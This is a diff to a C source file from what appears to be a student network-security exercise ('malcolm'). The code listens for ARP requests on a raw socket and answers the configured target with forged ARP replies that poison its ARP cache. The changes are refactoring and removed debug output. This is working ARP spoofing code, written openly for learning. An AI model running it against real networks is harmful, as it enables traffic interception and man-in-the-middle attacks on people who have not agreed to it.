@@ -6,64 +6,39 @@
 /*   By: eric <eric@student.42.fr>                  +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/04/17 13:53:15 by eric              #+#    #+#             */
-/*   Updated: 2026/04/17 17:13:23 by eric             ###   ########.fr       */
+/*   Updated: 2026/04/20 14:05:11 by eric             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "malcolm.h"
 
-void	sniff_arp(int sockfd, const char *iface, const t_arp *spoofed_arp)
+void	sniff_arp(int sockfd, const char *iface, const t_config *conf)
 {
 	u_int8_t	buffer[BUFFER_SIZE];
 	ssize_t		len;
 
-	while (1)
+	while (!g_signal)
 	{
-		printf("Waiting for packets\n");
 		len = recvfrom(sockfd, buffer, BUFFER_SIZE, 0, NULL, NULL);
-		// printf("Received: %ld bytes\n", len);
-		if (len <= 0)
-			continue;
-		//1. Verifier taille minimal Ethernet
-		if ((size_t)len < sizeof(t_ethernet))
-			continue;
-		//2 Lire header
+		// printf("recv: %ld\n", len);
+	 	if (len < (ssize_t)sizeof(t_ethernet))
+        	continue;
 		t_ethernet *eth = (t_ethernet *)buffer;
-		//3. Verifier si ARP
 		if (ntohs(eth->type) != 0x0806)
 			continue;
-		printf ("ARP packet detected\n");
-		if ((size_t)len < sizeof(t_ethernet) + sizeof(t_arp))
-			continue;
 		t_arp *arp = (t_arp *)(buffer + sizeof(t_ethernet));
-		printf("Sender MAC: ");
-		print_mac(arp->sender_mac);
-		printf(" | Sender IP: ");
-		print_ip(arp->sender_ip);
-		printf("\nTarget IP: ");
-		print_ip(arp->target_ip);
-		printf(" ");
-		if (ntohs(arp->opcode) == ARP_REQUEST)
+		if (ntohs(arp->opcode) == ARP_REQUEST 
+		&& memcmp(arp->target_ip, conf->spoof_ip, 4) == 0 
+		&& memcmp(arp->sender_ip, conf->target_ip, 4) == 0)
 		{
-			// Only respond if target IP matches the spoofed IP
-			if (memcmp(arp->target_ip, spoofed_arp->sender_ip, 4) == 0)
-			{
-				printf("-> ARP REQUEST (RESPONDING)\n");
-				send_arp_reply(sockfd, iface, arp, spoofed_arp);
-				break ;
-			}
-			else
-				printf("-> ARP REQUEST (IGNORED)\n");
+			printf("[DEBUG] ARP request seen → forcing reply\n");
+    		send_arp_reply(sockfd, iface, arp, conf);
+    		return;
 		}
-		else if (ntohs(arp->opcode) == ARP_REPLY)
-			printf("-> ARP REPLY\n");
-		else
-			printf("-> UNKNOWN\n");
-		// sleep(1);
 	}
 }
 
-int	send_arp_reply(int sockfd, const char *iface, t_arp *arp, const t_arp *spoofed_arp)
+int	send_arp_reply(int sockfd, const char *iface, t_arp *arp, const t_config *conf)
 {
 	uint8_t		buffer[sizeof(t_arp) + sizeof(t_ethernet)];
 	t_ethernet	*eth;
@@ -73,7 +48,7 @@ int	send_arp_reply(int sockfd, const char *iface, t_arp *arp, const t_arp *spoof
 	reply = (t_arp *)(buffer + sizeof(t_ethernet));
 
 	ft_memcpy(eth->dst_mac, arp->sender_mac, 6);
-	ft_memcpy(eth->src_mac, spoofed_arp->sender_mac, 6);
+	ft_memcpy(eth->src_mac, conf->spoof_mac, 6);
 	eth->type = htons(0x0806);
 	
 	reply->htype = htons(1);
@@ -83,8 +58,8 @@ int	send_arp_reply(int sockfd, const char *iface, t_arp *arp, const t_arp *spoof
 	reply->opcode = htons(2);
 
 	// Sender of reply = spoofed MAC/IP
-	ft_memcpy(reply->sender_mac, spoofed_arp->sender_mac, 6);
-	ft_memcpy(reply->sender_ip, spoofed_arp->sender_ip, 4);
+	ft_memcpy(reply->sender_mac, conf->spoof_mac, 6);
+	ft_memcpy(reply->sender_ip, conf->spoof_ip, 4);
 	// Target of reply = sender of request
 	ft_memcpy(reply->target_mac, arp->sender_mac, 6);
 	ft_memcpy(reply->target_ip, arp->sender_ip, 4);
@@ -110,9 +85,9 @@ int	send_arp_reply(int sockfd, const char *iface, t_arp *arp, const t_arp *spoof
 	printf("Told ");
 	print_ip(arp->sender_ip);
 	printf(" that ");
-	print_ip(spoofed_arp->sender_ip);
+	print_ip(conf->spoof_ip);
 	printf(" is at ");
-	print_mac(spoofed_arp->sender_mac);
+	print_mac(conf->spoof_mac);
 	printf("\n================================\n\n");
 	return (0);
 }
